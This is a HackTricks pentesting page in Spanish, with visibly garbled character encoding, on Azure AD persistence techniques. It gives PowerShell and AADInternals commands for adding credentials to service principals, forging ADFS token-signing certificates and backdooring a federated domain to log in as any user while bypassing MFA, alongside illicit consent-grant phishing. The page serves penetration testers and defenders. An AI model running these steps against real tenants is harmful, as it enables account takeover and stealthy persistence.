# Az - Persistencia

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en Github.

</details>

### Concesi贸n de consentimiento il铆cito

Por defecto, cualquier usuario puede registrar una aplicaci贸n en Azure AD. Por lo tanto, puedes registrar una aplicaci贸n (solo para el inquilino objetivo) que necesite permisos de alto impacto con el consentimiento del administrador (y aprobarlo si eres el administrador) - como enviar correo en nombre de un usuario, gesti贸n de roles, etc. Esto nos permitir谩 **ejecutar ataques de phishing** que ser铆an muy **fruct铆feros** en caso de 茅xito.

Adem谩s, tambi茅n podr铆as aceptar esa aplicaci贸n con tu usuario como una forma de mantener el acceso sobre ella.

### Aplicaciones y Principales de Servicio

Con privilegios de Administrador de Aplicaciones, GA o un rol personalizado con permisos de actualizaci贸n de microsoft.directory/aplicaciones/credenciales, podemos agregar credenciales (secreto o certificado) a una aplicaci贸n existente.

Es posible **apuntar a una aplicaci贸n con permisos elevados** o **agregar una nueva aplicaci贸n** con permisos elevados.

Un rol interesante para agregar a la aplicaci贸n ser铆a el **rol de administrador de autenticaci贸n privilegiada** ya que permite **restablecer la contrase帽a** de los administradores globales.

Esta t茅cnica tambi茅n permite **burlar la MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Para autenticaci贸n basada en certificado

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federaci贸n - Certificado de firma de token

Con **privilegios de DA** en AD local, es posible crear e importar **nuevos certificados de firma de token** y **descifrado de token** que tienen una validez muy larga. Esto nos permitir谩 **iniciar sesi贸n como cualquier usuario** cuyo ImuutableID conozcamos.

**Ejecuta** el siguiente comando como **DA en el servidor(es) ADFS** para crear nuevos certificados (contrase帽a predeterminada 'AADInternals'), agregarlos a ADFS, desactivar la rotaci贸n autom谩tica y reiniciar el servicio:

```powershell
New-AADIntADFSSelfSignedCertificates
```

Luego, actualiza la informaci贸n del certificado con Azure AD:

```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```

### Federaci贸n - Dominio de confianza

Con privilegios de GA en un inquilino, es posible **agregar un nuevo dominio** (debe ser verificado), configurar su tipo de autenticaci贸n como federado y configurar el dominio para **confiar en un certificado espec铆fico** (any.sts en el siguiente comando) y emisor:

```powershell
# Usando AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Obtener el ImmutableID del usuario que queremos suplantar. Usando el m贸dulo Msol
Get-MsolUser | select userPrincipalName,ImmutableID

# Acceder a cualquier aplicaci贸n en la nube como el usuario
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```

## Referencias

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en Github.

</details>